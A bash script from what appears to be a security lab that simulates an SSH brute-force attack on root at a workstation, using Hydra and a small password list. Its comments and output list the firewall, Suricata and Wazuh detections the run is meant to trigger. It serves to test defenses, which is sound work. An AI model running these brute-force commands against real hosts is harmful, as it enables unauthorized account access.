#!/bin/bash
# Attack Simulation 03 — SSH Brute Force
# MITRE ATT&CK: T1110.001 — Brute Force: Password Guessing
# Attacker: Kali (10.10.10.20) in DMZ
# Target:   Workstation (10.10.20.10) port 22
# Expected VyOS action:  BLOCK — DMZ→Internal allows HTTP only; SSH port dropped
# Expected Suricata SID: 9001011 (SSH brute force threshold), 9002002 (DMZ→MGMT denied)
# Expected Wazuh alert:  rule group "suricata" — attempted-admin classtype

set -euo pipefail

TARGET="10.10.20.10"
LOG_DIR="/tmp/attack-logs"
mkdir -p "$LOG_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
WORDLIST="/opt/attacks/wordlists/passwords.txt"

# Generate a small wordlist if not present
if [ ! -f "$WORDLIST" ]; then
    mkdir -p /opt/attacks/wordlists
    printf 'password\n123456\nadmin\nroot\nlabpassword\nletmein\nqwerty\n' > "$WORDLIST"
fi

echo "============================================================"
echo "  ATTACK 03 — SSH Brute Force (T1110.001)"
echo "  Attacker: $(hostname) | Target: $TARGET:22"
echo "  Time: $(date)"
echo "============================================================"

# Phase 1: Single SSH connection attempt (tests basic connectivity)
echo "[+] Phase 1: SSH connectivity test (expect blocked from DMZ)"
timeout 5 ssh -o StrictHostKeyChecking=no \
              -o ConnectTimeout=3 \
              -o BatchMode=yes \
              "root@$TARGET" "id" 2>&1 | \
    tee "$LOG_DIR/03a-ssh-test-$TIMESTAMP.txt" || \
    echo "[BLOCKED] SSH connection failed — VyOS DMZ→Internal SSH not allowed"

sleep 2

# Phase 2: Hydra brute force (rapid connection attempts trigger SID 9001011)
echo "[+] Phase 2: Hydra SSH brute force (generates detection events)"
if command -v hydra &>/dev/null; then
    timeout 30 hydra -l root \
        -P "$WORDLIST" \
        -t 4 \
        -f \
        "ssh://$TARGET" \
        2>&1 | tee "$LOG_DIR/03b-hydra-brute-$TIMESTAMP.txt" || \
        echo "[TIMEOUT/BLOCKED] Hydra exhausted — check VyOS logs"
else
    echo "[INFO] Hydra not installed — generating manual rapid connections"
    for i in $(seq 1 8); do
        timeout 2 ssh -o StrictHostKeyChecking=no \
                      -o ConnectTimeout=1 \
                      -o BatchMode=yes \
                      "root@$TARGET" "id" 2>/dev/null || true
        sleep 0.5
    done
    echo "[*] Generated 8 rapid SSH SYN attempts — should trigger SID 9001011"
fi

echo ""
echo "[RESULTS] Output saved to $LOG_DIR/"
echo "[EXPECTED DETECTIONS]"
echo "  VyOS:     dropped on DMZ-TO-INTERNAL (port 22 not in HTTP-only allow-list)"
echo "  Suricata SID 9001011 — SSH threshold exceeded (5 attempts in 30s)"
echo "  EVE JSON event_type: alert, classtype: attempted-admin"
echo "  Wazuh dashboard: Security Alerts > attempted-admin"
echo "============================================================"
